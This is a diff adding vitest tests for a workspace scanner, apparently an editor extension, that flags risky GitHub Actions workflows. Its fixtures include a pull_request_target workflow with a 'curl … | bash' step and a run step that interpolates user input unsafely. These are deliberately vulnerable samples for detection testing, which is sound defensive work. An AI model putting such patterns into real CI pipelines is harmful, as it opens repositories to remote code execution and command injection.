@@ -1,4 +1,4 @@
-import { mkdtemp, readFile, rm } from "node:fs/promises";
+import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
 import path from "node:path";
 import { tmpdir } from "node:os";
 import { afterEach, describe, expect, it, vi } from "vitest";
@@ -7,6 +7,7 @@ import {
   HOME_WARNING_ACTIONS,
   activateHomeguardExtension,
   createHomeguardCommandHandlers,
+  scanGithubMetadata,
   type HomeguardExtensionHost,
   type WorkspaceFoldersChangeEventLike
 } from "../src";
@@ -39,6 +40,12 @@ afterEach(async () => {
     await rm(dirPath, { recursive: true, force: true });
   }));
 });
+
+async function writeRepoFile(rootPath: string, relativePath: string, content: string): Promise<void> {
+  const targetPath = path.join(rootPath, relativePath);
+  await mkdir(path.dirname(targetPath), { recursive: true });
+  await writeFile(targetPath, content, "utf8");
+}
 
 async function createHost(overrides: Partial<HomeguardExtensionHost> = {}): Promise<{
   host: HomeguardExtensionHost;
@@ -169,6 +176,61 @@ describe("activateHomeguardExtension", () => {
     expect(activation.telemetryReport?.settings.some((entry) => entry.status === "Actionable")).toBe(true);
     expect(activation.telemetryReport?.extensions.some((entry) => entry.status === "Risky")).toBe(true);
   });
+
+  it("summarizes risky .github automation on startup when scanner support is available", async () => {
+    const repoDir = await mkdtemp(path.join(tmpdir(), "homeguard-gh-review-"));
+    tempDirs.push(repoDir);
+    await writeRepoFile(repoDir, ".github/workflows/release.yml", `name: release
+on:
+  pull_request_target:
+jobs:
+  ship:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+      - run: curl https://example.invalid/install.sh | bash
+`);
+    const { host } = await createHost({
+      workspaceFolders: [{ uri: { fsPath: repoDir } }],
+      scanGithubMetadata
+    });
+
+    const activation = await activateHomeguardExtension(host, {
+      githubReview: {
+        checkOnStartup: true
+      }
+    });
+
+    expect(activation.githubMetadataSummary).toEqual(expect.objectContaining({
+      workspaceFoldersScanned: 1,
+      workspaceFoldersWithGithub: 1,
+      workspaceFoldersWithRisk: 1
+    }));
+    expect(activation.githubMetadataSummary?.highFindings).toBeGreaterThan(0);
+    expect(activation.githubMetadataReports?.[0]?.scannedFiles).toContain(".github/workflows/release.yml");
+  });
+
+  it("does not surface startup .github review when findings are informational only", async () => {
+    const repoDir = await mkdtemp(path.join(tmpdir(), "homeguard-gh-review-"));
+    tempDirs.push(repoDir);
+    await writeRepoFile(repoDir, ".github/CODEOWNERS", `* @security-team
+`);
+    const { host } = await createHost({
+      workspaceFolders: [{ uri: { fsPath: repoDir } }],
+      scanGithubMetadata
+    });
+
+    const activation = await activateHomeguardExtension(host, {
+      githubReview: {
+        checkOnStartup: true
+      }
+    });
+
+    expect(activation.githubMetadataReports?.[0]?.scannedFiles).toContain(".github/CODEOWNERS");
+    expect(activation.githubMetadataSummary).toBeUndefined();
+  });
 });
 
 describe("createHomeguardCommandHandlers", () => {
@@ -238,5 +300,30 @@ describe("createHomeguardCommandHandlers", () => {
     expect(openedFolders.map((entry) => path.normalize(entry))).toEqual([
       path.normalize(path.join(homeDir, "work", "_escape"))
     ]);
+  });
+
+  it("reviews .github automation for the current workspace on demand", async () => {
+    const repoDir = await mkdtemp(path.join(tmpdir(), "homeguard-gh-review-"));
+    tempDirs.push(repoDir);
+    await writeRepoFile(repoDir, ".github/workflows/ci.yml", `name: ci
+on:
+  workflow_dispatch:
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "\${{ github.event.inputs.name }}"
+`);
+    const { host } = await createHost({
+      workspaceFolders: [{ uri: { fsPath: repoDir } }],
+      scanGithubMetadata
+    });
+    const handlers = createHomeguardCommandHandlers(host);
+
+    const reports = await handlers.reviewGithubMetadata();
+
+    expect(reports).toHaveLength(1);
+    expect(reports[0]?.findings.length).toBeGreaterThan(0);
+    expect(reports[0]?.scannedFiles).toContain(".github/workflows/ci.yml");
   });
 });
